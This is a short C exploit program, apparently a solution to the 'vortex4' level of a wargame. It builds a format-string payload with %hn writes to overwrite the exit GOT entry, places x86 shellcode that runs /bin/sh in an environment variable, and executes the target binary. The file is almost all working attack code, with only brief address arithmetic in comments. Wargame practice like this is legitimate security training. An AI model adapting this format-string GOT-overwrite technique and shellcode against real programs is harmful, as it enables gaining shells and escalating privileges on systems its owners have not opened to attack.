#include <unistd.h>

//exit: 0x804a014
//shellcode: 0xffffdfc6
//0xffff = 65535
//0xdfc6 = 57286
//57278=57286-8

int main(void) {
	char payload[80] = "\x16\xa0\x04\x08\x14\xa0\x04\x08""%57278d%124$hn%8249d%123$hn";
	char *environment[19] = {"AAAA", "BBBB", payload, "DDDDDD", "EEEE", "FFFF", "GGGG", "HHHH", "IIII", "JJJJ", "KKKK", "LLLL", "MMMM", "NNNN", "OOOO", "PPPP", "QQQQ", "SHELLCODE=\x50\xd4\xff\xff\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x89\xe5\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x8d\x0c\x24\x31\xc0\x50\x51\x8b\x1c\x24\x89\xe1\xb0\x0b\xcd\x80", 0};
	char *empty[] = {NULL};
	execve("./vortex4", empty, environment);
 }
